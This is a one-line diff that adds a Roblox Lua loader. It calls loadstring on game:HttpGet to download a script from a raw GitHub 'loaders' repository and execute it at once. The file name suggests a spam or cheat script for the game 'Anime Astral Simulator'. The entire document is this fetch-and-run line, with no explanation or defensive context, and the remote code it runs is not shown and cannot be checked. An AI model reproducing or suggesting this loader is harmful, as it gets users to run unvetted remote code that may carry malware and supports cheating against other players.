@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/mafuba-anime-astral-simulator-spam3-d68algboib8muu.lua"))()
